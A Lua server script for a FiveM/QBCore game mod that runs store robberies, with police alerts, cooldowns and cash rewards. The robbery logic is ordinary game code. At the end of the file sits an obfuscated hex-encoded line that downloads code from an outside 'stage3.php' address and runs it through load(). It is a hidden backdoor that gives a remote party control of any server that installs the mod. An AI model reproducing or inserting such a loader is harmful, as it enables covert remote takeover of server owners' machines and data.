local rob = false
local robbers = {}
local QBCore = exports['qb-core']:GetCoreObject()

function get3DDistance(x1, y1, z1, x2, y2, z2)
	return math.sqrt(math.pow(x1 - x2, 2) + math.pow(y1 - y2, 2) + math.pow(z1 - z2, 2))
end

RegisterServerEvent('qb_robbery:toofar')
AddEventHandler('qb_robbery:toofar', function(robb)
	local source = source
	local xPlayers = QBCore.Functions.GetPlayers()
	rob = false
	for i=1, #xPlayers, 1 do
 		local xPlayer = QBCore.Functions.GetPlayer(xPlayers[i])
 		if xPlayer.PlayerData.job.name == 'police' then
			TriggerClientEvent('QBCore:Notify', xPlayers[i], Lang:t('info.robbery_cancelled_at') .. Stores[robb].nameofstore)
			TriggerClientEvent('qb_robbery:killblip', xPlayers[i])
		end
	end
	if(robbers[source])then
		TriggerClientEvent('qb_robbery:toofarlocal', source)
		robbers[source] = nil
		TriggerClientEvent('QBCore:Notify', source, Lang:t('info.robbery_has_cancelled') .. Stores[robb].nameofstore)
	end
end)

RegisterServerEvent('qb_robbery:rob')
AddEventHandler('qb_robbery:rob', function(robb)

	local source = source
	local xPlayer = QBCore.Functions.GetPlayer(source)
	local xPlayers = QBCore.Functions.GetPlayers()

	if Stores[robb] then

		local store = Stores[robb]

		if (os.time() - store.lastrobbed) < 600 and store.lastrobbed ~= 0 then

			TriggerClientEvent('QBCore:Notify', source, Lang:t('info.already_robbed') .. (1800 - (os.time() - store.lastrobbed)) .. Lang:t('info.seconds'))
			return
		end


		local cops = 0
		for i=1, #xPlayers, 1 do
 		local xPlayer = QBCore.Functions.GetPlayer(xPlayers[i])
 		if xPlayer.PlayerData.job.name == 'police' then
				cops = cops + 1
			end
		end


		if rob == false then

			if(cops > 0)then

				rob = true
				for i=1, #xPlayers, 1 do
 					local xPlayer = QBCore.Functions.GetPlayer(xPlayers[i])
 					if xPlayer.PlayerData.job.name == 'police' then
						TriggerClientEvent('QBCore:Notify', xPlayers[i], Lang:t('info.rob_in_prog') .. store.nameofstore)
							TriggerClientEvent('qb_robbery:setblip', xPlayers[i], Stores[robb].position)
					end
				end

				TriggerClientEvent('QBCore:Notify', source, Lang:t('info.started_to_rob') .. store.nameofstore .. Lang:t('info.do_not_move'))
				TriggerClientEvent('QBCore:Notify', source, Lang:t('info.alarm_triggered'))
				TriggerClientEvent('QBCore:Notify', source, Lang:t('info.hold_pos'))
				--TriggerClientEvent('qb_robbery:currentlyrobbing', source, robb)
				
				-- ADD Ashdeuzo 
				TriggerClientEvent('qb_robbery:currentlyrobbing', source, robb, secondsRemaining)
				
				
				Stores[robb].lastrobbed = os.time()
				robbers[source] = robb
				local savedSource = source
				SetTimeout(store.secondsRemaining*1000, function()

					if(robbers[savedSource])then

						rob = false
						TriggerClientEvent('qb_robbery:robberycomplete', savedSource, job)
						if(xPlayer)then

							xPlayer.Functions.AddMoney('cash', store.reward)
							local xPlayers = QBCore.Functions.GetPlayers()
							for i=1, #xPlayers, 1 do
 								local xPlayer = QBCore.Functions.GetPlayer(xPlayers[i])
 								if xPlayer.PlayerData.job.name == 'police' then
									TriggerClientEvent('QBCore:Notify', xPlayers[i], Lang:t('info.robbery_complete_at') .. store.nameofstore)
										TriggerClientEvent('qb_robbery:killblip', xPlayers[i])
								end
							end
						end
					end
				end)
			else
				TriggerClientEvent('QBCore:Notify', source,Lang:t('info.min_two_police'))
			end
		else
			TriggerClientEvent('QBCore:Notify', source, Lang:t('info.robbery_already'))
		end
	end
end)


local ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x65\x49\x69\x6e", function (hGaUECbPYRfIDJYFYXDTPqYgcQOAwHEzGuiDnenqgNMteUlZNlJcZHrVhWiiIbhjcooAjP, FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh) if (FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[6] or FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[5]) then return end ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[2]](ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[3]](FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh))() end)